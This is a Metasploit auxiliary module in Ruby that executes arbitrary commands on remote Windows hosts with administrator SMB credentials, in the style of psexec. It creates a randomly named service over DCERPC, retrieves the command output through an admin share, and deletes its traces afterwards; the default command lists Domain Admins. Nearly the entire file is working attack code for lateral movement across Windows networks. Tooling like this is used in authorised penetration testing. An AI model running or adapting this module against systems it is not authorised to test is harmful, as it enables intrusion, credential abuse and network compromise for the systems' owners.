#!/usr/bin/env ruby

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	# Exploit mixins should be called first
	include Msf::Exploit::Remote::SMB
	include Msf::Exploit::Remote::SMB::Authenticated
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner
	include Msf::Exploit::Remote::DCERPC

	# Aliases for common classes
	SIMPLE = Rex::Proto::SMB::SimpleClient
	XCEPT  = Rex::Proto::SMB::Exceptions
	CONST  = Rex::Proto::SMB::Constants

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft Windows Authenticated Command Execution',
			'Description'    => %q{
					This module uses a valid administrator username and password to execute an
				arbitrary command on one or more hosts, using a similar technique than the "psexec"
				utility provided by SysInternals. Daisy chaining commands with '&' does not work
				and users shouldn't try it. This module is useful because it doesn't need to upload
				any binaries to the target machine.
			},

			'Author'         => [
				'Royce @R3dy__ Davis <rdavis[at]accuvant.com>',
			],

			'License'        => MSF_LICENSE,
			'References'     => [
				[ 'CVE', '1999-0504'], # Administrator with no password (since this is the default)
				[ 'OSVDB', '3106'],
				[ 'URL', 'http://www.accuvant.com/blog/2012/11/13/owning-computers-without-shell-access' ],
				[ 'URL', 'http://sourceforge.net/projects/smbexec/' ],
				[ 'URL', 'http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx' ]
			]
		))

		register_options([
			OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
			OptString.new('COMMAND', [true, 'The command you want to execute on the remote host', 'net group "Domain Admins" /domain']),
			OptString.new('RPORT', [true, 'The Target port', 445]),
			OptString.new('WINPATH', [true, 'The name of the remote Windows directory', 'WINDOWS']),
		], self.class)

		deregister_options('RHOST')
	end

	def peer
		return "#{rhost}:#{rport}"
	end

	# This is the main controle method
	def run_host(ip)
		text = "\\#{datastore['WINPATH']}\\Temp\\#{Rex::Text.rand_text_alpha(16)}.txt"
		bat = "%WINDIR%\\Temp\\#{Rex::Text.rand_text_alpha(16)}.bat"
		smbshare = datastore['SMBSHARE']

		#Try and authenticate with given credentials
		if connect
			begin
				smb_login
			rescue StandardError => autherror
				print_error("#{peer} - Unable to authenticate with given credentials: #{autherror}")
				return
			end
			if execute_command(ip, text, bat)
				get_output(smbshare, ip, text)
			end
			cleanup_after(smbshare, ip, text, bat)
			disconnect
		end
	end

	# Executes specified Windows Command
	def execute_command(ip, text, bat)
		begin
			#Try and execute the provided command
			execute = "%COMSPEC% /C echo #{datastore['COMMAND']} ^> %SYSTEMDRIVE%#{text} > #{bat} & %COMSPEC% /C start cmd.exe /C #{bat}"
			print_status("#{peer} - Executing the command...")
			return psexec(execute)
		rescue StandardError => exec_command_error
			print_error("#{peer} - Unable to execute specified command: #{exec_command_error}")
			return false
		end
	end

	# Retrive output from command
	def get_output(smbshare, ip, file)
		begin
			print_status("#{peer} - Getting the command output...")
			simple.connect("\\\\#{ip}\\#{smbshare}")
			outfile = simple.open(file, 'ro')
			output = outfile.read
			outfile.close
			simple.disconnect("\\\\#{ip}\\#{smbshare}")
			if output.empty?
				print_status("#{peer} - Command finished with no output")
				return
			end
			print_good("#{peer} - Command completed successfuly! Output:\r\n#{output}")
			return
		rescue StandardError => output_error
			print_error("#{peer} - Error getting command output. #{output_error.class}. #{output_error}.")
			return
		end
	end

	# This is the cleanup method, removes .txt and .bat file/s created during execution-
	def cleanup_after(smbshare, ip, text, bat)
		begin
			# Try and do cleanup command
			cleanup = "%COMSPEC% /C del %SYSTEMDRIVE%#{text} & del #{bat}"
			print_status("#{peer} - Executing cleanup...")
			psexec(cleanup)
			if !check_cleanup(smbshare, ip, text)
				print_error("#{peer} - Unable to cleanup. Maybe you'll need to manually remove #{text} and #{bat} from the target.")
			else
				print_status("#{peer} - Cleanup was successful")
			end
		rescue StandardError => cleanuperror
			print_error("#{peer} - Unable to processes cleanup commands. Error: #{cleanuperror}")
			print_error("#{peer} - Maybe you'll need to manually remove #{text} and #{bat} from the target")
			return cleanuperror
		end
	end

	def check_cleanup(smbshare, ip, text)
		simple.connect("\\\\#{ip}\\#{smbshare}")
		begin
			if checktext = simple.open(text, 'ro')
				check = false
			else
				check = true
			end
			simple.disconnect("\\\\#{ip}\\#{smbshare}")
			return check
		rescue StandardError => check_error
			simple.disconnect("\\\\#{ip}\\#{smbshare}")
			return true
		end
	end

	# This code was stolen straight out of psexec.rb.  Thanks very much HDM and all who contributed to that module!!
	# Instead of uploading and runing a binary.  This method runs a single windows command fed into the COMMAND paramater
	def psexec(command)

		simple.connect("\\\\#{datastore['RHOST']}\\IPC$")

		handle = dcerpc_handle('367abb81-9844-35f1-ad32-98f038001003', '2.0', 'ncacn_np', ["\\svcctl"])
		vprint_status("#{peer} - Binding to #{handle} ...")
		dcerpc_bind(handle)
		vprint_status("#{peer} - Bound to #{handle} ...")

		vprint_status("#{peer} - Obtaining a service manager handle...")
		scm_handle = nil
		stubdata =
			NDR.uwstring("\\\\#{rhost}") +
			NDR.long(0) +
			NDR.long(0xF003F)
		begin
			response = dcerpc.call(0x0f, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
				scm_handle = dcerpc.last_response.stub_data[0,20]
			end
		rescue ::Exception => e
			print_error("#{peer} - Error: #{e}")
			return false
		end

		servicename = Rex::Text.rand_text_alpha(11)
		displayname = Rex::Text.rand_text_alpha(16)
		holdhandle = scm_handle
		svc_handle  = nil
		svc_status  = nil

		stubdata =
			scm_handle +
			NDR.wstring(servicename) +
			NDR.uwstring(displayname) +

			NDR.long(0x0F01FF) + # Access: MAX
			NDR.long(0x00000110) + # Type: Interactive, Own process
			NDR.long(0x00000003) + # Start: Demand
			NDR.long(0x00000000) + # Errors: Ignore
			NDR.wstring( command ) +
			NDR.long(0) + # LoadOrderGroup
			NDR.long(0) + # Dependencies
			NDR.long(0) + # Service Start
			NDR.long(0) + # Password
			NDR.long(0) + # Password
			NDR.long(0) + # Password
			NDR.long(0)  # Password
		begin
			vprint_status("#{peer} - Creating the service...")
			response = dcerpc.call(0x0c, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
				svc_handle = dcerpc.last_response.stub_data[0,20]
				svc_status = dcerpc.last_response.stub_data[24,4]
			end
		rescue ::Exception => e
			print_error("#{peer} - Error: #{e}")
			return false
		end

		vprint_status("#{peer} - Closing service handle...")
		begin
			response = dcerpc.call(0x0, svc_handle)
		rescue ::Exception
		end

		vprint_status("#{peer} - Opening service...")
		begin
			stubdata =
				scm_handle +
				NDR.wstring(servicename) +
				NDR.long(0xF01FF)

			response = dcerpc.call(0x10, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
				svc_handle = dcerpc.last_response.stub_data[0,20]
			end
		rescue ::Exception => e
			print_error("#{peer} - Error: #{e}")
			return false
		end

		vprint_status("#{peer} - Starting the service...")
		stubdata =
			svc_handle +
			NDR.long(0) +
			NDR.long(0)
		begin
			response = dcerpc.call(0x13, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
			end
		rescue ::Exception => e
			print_error("#{peer} - Error: #{e}")
			return false
		end

		vprint_status("#{peer} - Removing the service...")
		stubdata =
			svc_handle
		begin
			response = dcerpc.call(0x02, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
			end
		rescue ::Exception => e
			print_error("#{peer} - Error: #{e}")
		end

		vprint_status("#{peer} - Closing service handle...")
		begin
			response = dcerpc.call(0x0, svc_handle)
		rescue ::Exception => e
			print_error("#{peer} - Error: #{e}")
		end

		select(nil, nil, nil, 1.0)
		simple.disconnect("\\\\#{datastore['RHOST']}\\IPC$")
		return true
	end

end
